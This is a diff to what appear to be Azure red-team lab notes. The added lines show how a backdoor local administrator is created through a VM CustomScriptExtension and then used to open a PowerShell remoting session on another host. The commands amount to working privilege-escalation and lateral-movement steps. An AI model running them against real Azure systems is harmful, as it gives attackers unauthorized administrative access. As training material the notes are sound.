@@ -1228,5 +1228,15 @@ Great now lets set the CustomScriptExtension to run a command using ```commandTo
 Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student213 Stud213Password@123 /add /Y; net localgroup administrators student213 /add"}'
 ```
 
+ok great, now back on JumpVM if we do a little investigating with ```netstat -ano -t -b``` we can see connections to an IP ```10.0.0.5``` over port ```5985``` for ```wsmprovhost``` - which is powershell remoting!
+
+```
+$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force 
+$creds = New-Object System.Management.Automation.PSCredential('.\student213', $Password)
+$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
+Invoke-Command -Session $infradminsrv -ScriptBlock{hostname} infradminsrv
+```
+
+
 ## Script Extension
 ## Primary Refresh Token
